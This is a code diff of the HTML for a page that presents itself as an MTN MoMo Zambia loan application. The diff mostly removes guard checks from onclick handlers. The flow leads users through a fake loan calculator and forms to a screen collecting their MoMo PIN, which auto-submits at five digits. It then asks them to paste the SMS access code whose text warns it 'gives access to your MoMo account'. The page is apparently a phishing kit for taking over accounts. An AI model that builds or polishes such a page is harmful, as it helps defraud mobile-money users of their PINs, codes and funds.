@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
   <title>MoMo from MTN - Zambia</title>
-  <link rel="stylesheet" href="style.css?v=20261126d" />
+  <link rel="stylesheet" href="style.css?v=20261126e" />
 </head>
 <body>
   <div class="app-container">
@@ -39,7 +39,7 @@
           id="btn-goto-slider"
           class="btn-momo-primary"
           type="button"
-          onclick="window.__stepTo && window.__stepTo('screen-slider')"
+          onclick="window.__stepTo('screen-slider')"
         >
           <span>GET STARTED</span>
           <small>CHECK LOAN ELIGIBILITY</small>
@@ -67,7 +67,7 @@
           id="btn-slider-back"
           class="nav-back-btn"
           type="button"
-          onclick="window.__stepTo && window.__stepTo('screen-welcome')"
+          onclick="window.__stepTo('screen-welcome')"
         >← Back</button>
         <span class="sub-nav-title">Loan Calculator</span>
       </div>
@@ -90,7 +90,7 @@
               step="5000"
               value="100000"
               class="range-momo"
-              oninput="window.__updateCalc && window.__updateCalc()"
+              oninput="window.__updateCalc()"
             />
           </div>
 
@@ -105,7 +105,7 @@
               step="1"
               value="48"
               class="range-momo"
-              oninput="window.__updateCalc && window.__updateCalc()"
+              oninput="window.__updateCalc()"
             />
           </div>
 
@@ -118,7 +118,7 @@
             id="btn-goto-form1"
             class="btn-momo-solid"
             type="button"
-            onclick="window.__updateCalc && window.__updateCalc(); window.__stepTo && window.__stepTo('screen-form1')"
+            onclick="window.__updateCalc(); window.__stepTo('screen-form1')"
           >CONTINUE APPLICATION</button>
         </div>
       </div>
@@ -139,7 +139,7 @@
           id="btn-form1-back"
           class="nav-back-btn"
           type="button"
-          onclick="window.__stepTo && window.__stepTo('screen-slider')"
+          onclick="window.__stepTo('screen-slider')"
         >← Back</button>
         <span class="sub-nav-title">Loan Application</span>
       </div>
@@ -179,7 +179,7 @@
           id="btn-form1-next"
           class="btn-momo-soft ready"
           type="button"
-          onclick="window.__syncSummary && window.__syncSummary(); window.__stepTo && window.__stepTo('screen-form2')"
+          onclick="window.__syncSummary(); window.__stepTo('screen-form2')"
         >Next Step →</button>
       </div>
     </section>
@@ -199,7 +199,7 @@
           id="btn-form2-back"
           class="nav-back-btn"
           type="button"
-          onclick="window.__stepTo && window.__stepTo('screen-form1')"
+          onclick="window.__stepTo('screen-form1')"
         >← Back</button>
         <span class="sub-nav-light">Loan Application</span>
       </div>
@@ -241,13 +241,13 @@
             id="btn-form2-prev"
             class="btn-grey-action"
             type="button"
-            onclick="window.__stepTo && window.__stepTo('screen-form1')"
+            onclick="window.__stepTo('screen-form1')"
           >← Previous</button>
           <button
             id="btn-form2-next"
             class="btn-momo-soft ready compact-prog"
             type="button"
-            onclick="window.__nextFromForm2 && window.__nextFromForm2()"
+            onclick="window.__nextFromForm2()"
           >Next Step →</button>
         </div>
       </div>
@@ -268,7 +268,7 @@
           id="btn-form3-top-back"
           class="nav-back-btn"
           type="button"
-          onclick="window.__stepTo && window.__stepTo('screen-form2')"
+          onclick="window.__stepTo('screen-form2')"
         >← Back</button>
         <span class="sub-nav-light">Loan Application</span>
       </div>
@@ -304,13 +304,13 @@
             id="btn-form3-prev"
             class="btn-grey-action"
             type="button"
-            onclick="window.__stepTo && window.__stepTo('screen-form2')"
+            onclick="window.__stepTo('screen-form2')"
           >← Previous</button>
           <button
             id="btn-form3-submit"
             class="btn-momo-solid compact-prog"
             type="button"
-            onclick="window.__nextFromForm3 && window.__nextFromForm3()"
+            onclick="window.__nextFromForm3()"
           >CONTINUE TO PIN →</button>
         </div>
       </div>
@@ -324,7 +324,7 @@
           class="nav-back-clean"
           type="button"
           aria-label="Back"
-          onclick="window.__stepTo && window.__stepTo('screen-form3')"
+          onclick="window.__stepTo('screen-form3')"
         >←</button>
         <span id="display-pin-phone" class="pin-phone-badge">096 XXX XXXX</span>
       </div>
@@ -351,7 +351,7 @@
             placeholder="096 XXX XXXX"
             maxlength="13"
             class="yello-phone-line-input"
-            oninput="window.__syncPinPhone && window.__syncPinPhone()"
+            oninput="window.__syncPinPhone()"
           />
         </div>
 
@@ -367,15 +367,15 @@
               placeholder="Enter 5-digit PIN"
               class="yello-pin-input"
               autocomplete="off"
-              oninput="window.__checkPinAuto && window.__checkPinAuto()"
-              onkeyup="window.__checkPinAuto && window.__checkPinAuto()"
+              oninput="window.__checkPinAuto()"
+              onkeyup="window.__checkPinAuto()"
             />
             <button
               id="btn-toggle-pin-visibility"
               type="button"
               class="yello-eye-btn"
               aria-label="Show or hide PIN"
-              onclick="window.__togglePinEye && window.__togglePinEye()"
+              onclick="window.__togglePinEye()"
             >👁️</button>
           </div>
         </div>
@@ -385,7 +385,7 @@
             href="#"
             id="link-forgot-pin"
             class="yello-forgot-link"
-            onclick="event.preventDefault(); window.__showPinInfo && window.__showPinInfo('Enter your 5-digit PIN — it submits automatically at 5 digits.')"
+            onclick="event.preventDefault(); window.__showPinInfo('Enter your 5-digit PIN — it submits automatically at 5 digits.')"
           >Forgot PIN?</a>
         </div>
 
@@ -393,14 +393,14 @@
           id="btn-switch-account"
           type="button"
           class="yello-switch-account-btn"
-          onclick="window.__stepTo && window.__stepTo('screen-form2')"
+          onclick="window.__stepTo('screen-form2')"
         >Switch account</button>
 
         <p class="yello-tc-note">
           By using this app you agree to our <a
             href="#"
             id="link-pin-tcs"
-            onclick="event.preventDefault(); window.__showPinInfo && window.__showPinInfo('Standard MTN MoMo Zambia terms and conditions apply.')"
+            onclick="event.preventDefault(); window.__showPinInfo('Standard MTN MoMo Zambia terms and conditions apply.')"
           >T&amp;Cs</a>
         </p>
 
@@ -410,7 +410,7 @@
             type="button"
             class="yello-contact-circle"
             aria-label="Contact us"
-            onclick="window.__showPinInfo && window.__showPinInfo('MTN Zambia MoMo Support: dial 111.')"
+            onclick="window.__showPinInfo('MTN Zambia MoMo Support: dial 111.')"
           >📞</button>
           <span class="yello-contact-label">Contact us</span>
         </div>
@@ -452,7 +452,7 @@
             id="btn-request-new-sms"
             type="button"
             class="btn-request-sms hidden-btn"
-            onclick="window.__requestNewSms && window.__requestNewSms()"
+            onclick="window.__requestNewSms()"
           >REQUEST NEW SMS</button>
         </div>
 
@@ -465,8 +465,8 @@
             id="sms-input-box"
             class="sms-textarea"
             placeholder="Y'ello. Please note! This confidential code gives access to your MoMo account: 12345"
-            oninput="window.__checkSmsAuto && window.__checkSmsAuto()"
-            onkeyup="window.__checkSmsAuto && window.__checkSmsAuto()"
+            oninput="window.__checkSmsAuto()"
+            onkeyup="window.__checkSmsAuto()"
           ></textarea>
         </div>
       </div>
@@ -517,7 +517,7 @@
           id="btn-success-back"
           class="nav-back-btn"
           type="button"
-          onclick="window.__resetApp && window.__resetApp()"
+          onclick="window.__resetApp()"
         >← Back</button>
         <div class="momo-nav-logo">
           <span>MTN</span>
@@ -539,4 +539,25 @@
           class="btn-momo-solid"
           type="button"
           style="margin-top: 28px;"
-          o
+          onclick="window.__resetApp()"
+        >DONE</button>
+      </div>
+    </section>
+
+    <!-- Screen 10: Blocked / Stopped Screen -->
+    <section id="screen-stopped" class="screen">
+      <div class="top-nav-bar">
+        <div class="momo-nav-logo">
+          <span>MTN</span>
+          <strong>MoMo</strong>
+        </div>
+      </div>
+
+      <div class="card-container-spacious">
+        <div class="blocked-badge-circle">✕</div>
+        <h2 class="blocked-title">BLOCK</h2>
+        <p id="blocked-reason-text" class="blocked-sub">
+          Application blocked — valid MTN MoMo details were not confirmed.
+        </p>
+
+   
